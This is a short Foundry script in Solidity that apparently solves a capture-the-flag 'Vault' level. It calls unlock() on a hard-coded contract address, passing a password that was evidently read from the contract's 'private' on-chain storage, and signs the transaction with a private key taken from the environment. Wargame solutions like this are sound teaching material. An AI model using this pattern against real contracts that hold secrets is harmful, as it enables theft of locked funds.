//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";

contract VaultSolution is Script {
    Vault public vaultInstance = Vault(0x68e4c72d2cE3Fc6aAd12Ab8b12cf1BE5f5E1D928);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}